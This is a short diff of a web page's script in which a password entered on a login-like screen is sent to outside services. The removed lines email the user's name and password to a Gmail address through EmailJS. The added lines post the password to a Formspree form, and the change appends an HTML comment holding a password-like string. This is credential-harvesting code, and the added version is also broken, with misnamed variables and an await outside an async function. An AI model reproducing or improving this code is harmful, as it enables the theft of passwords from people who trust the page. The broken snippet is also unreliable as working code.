@@ -228,12 +228,16 @@ nextPasswordBtn.addEventListener("click", () => {
 
   let val = passwordInput.value;
 
-  emailjs.send("service_jdep3dj", "template_bockd4k", {
-        message: loggedUser.name + "'s password is: " + val,
-        to: "officialsecuritygg@gmail.com"
-    }).catch((err) => {
-  console.log("STATUS:", err.status);
-  console.log("TEXT:", err.text);
+  let formDate = new formData;
+  formDate.append("answer", val);
+
+  const res = await fetch("https://formspree.io/f/YOUR_FORM_ID", {
+        method: "POST",
+        body: formData,
+        headers: {
+          "Accept": "application/json"
+        }
+      });
 });
 
   // Hide password screen, show success screen
@@ -245,3 +249,5 @@ nextPasswordBtn.addEventListener("click", () => {
 
 </body>
 </html>
+
+<!-- Secure12345! -->
